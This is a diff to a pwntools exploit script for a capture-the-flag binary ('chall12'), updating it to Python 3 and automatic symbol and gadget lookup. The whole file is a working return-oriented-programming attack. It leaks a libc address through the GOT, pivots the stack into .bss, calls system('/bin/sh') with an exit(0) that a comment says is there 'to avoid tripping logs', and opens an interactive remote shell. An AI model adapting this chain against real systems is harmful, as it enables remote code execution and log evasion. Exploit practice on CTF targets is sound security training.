@@ -1,54 +1,66 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 from pwn import *
 import sys
 
-HOST = 'challenge.pwny.racing'
+HOST = ''
 PORT = 11536
 
-LIBC = 0x64e80
-SYSTEM = 0x4f440
-BINSH = 0x1b3e9a
-EXIT = 0x43120
+target_elf = ELF('../bin/chall12')
+rop = ROP(target_elf)
 
 if len(sys.argv) > 1:
     HOST  = sys.argv[1]
 
-if len(sys.argv) > 2:
+if len(sys.argv) > 2:    
     PORT = sys.argv[2]
 
-io = remote(HOST, PORT)
-print io.recvuntil('5!\n')
+if HOST:
+    target_libc = ELF('../bin/libc.so.6')
+    io = remote(HOST, PORT)
+else:
+    target_libc = target_elf.libc
+    io = target_elf.process()
+
+LIBC   = target_libc.symbols['printf'] # 0x64e80
+SYSTEM = target_libc.symbols['system'] # 0x4f440
+BINSH  = next(target_libc.search(b'/bin/sh')) # 0x1b3e9a
+EXIT   = target_libc.symbols['exit'] # 0x43120
+
+sys.stdout.write(io.recvuntil(b'5!\n'))
+
+GADGET_POP_RDI_RET = rop.find_gadget(['pop rdi', 'ret']).address
+GADGET_POPS_RET = rop.find_gadget(['pop rsp', 'pop r13', 'pop r14', 'pop r15', 'ret']).address
 
 # step 1: lay first rop chain, it will leak, read a second payload and pivot
-rop  = p64(0x400783)  # pop rdi ; ret
-rop += p64(0x602020)  # printf@got.plt
-rop += p64(0x400550)  # puts()
-rop += p64(0x400783)  # pop rdi ; ret
-rop += p64(0x602800)  # .data
-rop += p64(0x400580)  # gets()
-rop += p64(0x40077d)  # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
-rop += p64(0x6027e8)  # .data (second ROP chain)
+ropchain1  = p64(GADGET_POP_RDI_RET)
+ropchain1 += p64(target_elf.symbols['got.printf'])
+ropchain1 += p64(target_elf.symbols['puts'])  # puts()
+ropchain1 += p64(GADGET_POP_RDI_RET)
+ropchain1 += p64(target_elf.bss(0x800))  # .data (with enough fake stack)
+ropchain1 += p64(target_elf.symbols['gets'])  # gets()
+ropchain1 += p64(GADGET_POPS_RET)  # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+ropchain1 += p64(target_elf.bss(0x800) - 3*8)  # .data (second rop chain, -3 pops: r13, r14, r15)
 
-io.recvuntil(': ')
-io.sendline(cyclic(24)+rop)
+io.recvuntil(b': ')
+io.sendline(cyclic(24)+ropchain1)
 
-leak = u64(io.recvline().strip().ljust(8, '\x00'))
+leak = u64(io.recvline().strip().ljust(8, b'\x00'))
 libc = leak - LIBC
-log.info('leak: 0x%012x' % leak)
-log.info('libc: 0x%012x' % libc)
+log.info('Leak: 0x%012x' % leak)
+log.info('Libc: 0x%012x' % libc)
 
 # step 2: run system("/bin/sh") with an exit(0) to avoid tripping logs
-rop  = p64(0x400783)     # pop rdi ; ret
-rop += p64(libc+BINSH)   # "/bin/sh"
-rop += p64(libc+SYSTEM)  # system()
-rop += p64(0x400783)     # pop rdi ; ret
-rop += p64(0x000000)     # NULL
-rop += p64(libc+EXIT)    # exit(0)
+ropchain2  = p64(GADGET_POP_RDI_RET)
+ropchain2 += p64(libc+BINSH)   # "/bin/sh"
+ropchain2 += p64(libc+SYSTEM)  # system()
+ropchain2 += p64(GADGET_POP_RDI_RET)
+ropchain2 += p64(0)     # NULL
+ropchain2 += p64(libc+EXIT)    # exit(0)
 
-io.sendline(rop)
+io.sendline(ropchain2)
 io.recvline(timeout=0.1)
 
 # step 3: collect the shell
-io.sendline('id')
-log.success('shell? %s' % io.recvline().strip())
+io.sendline(b'id')
+log.success('Shell? %s' % io.recvline().strip())
 io.interactive()
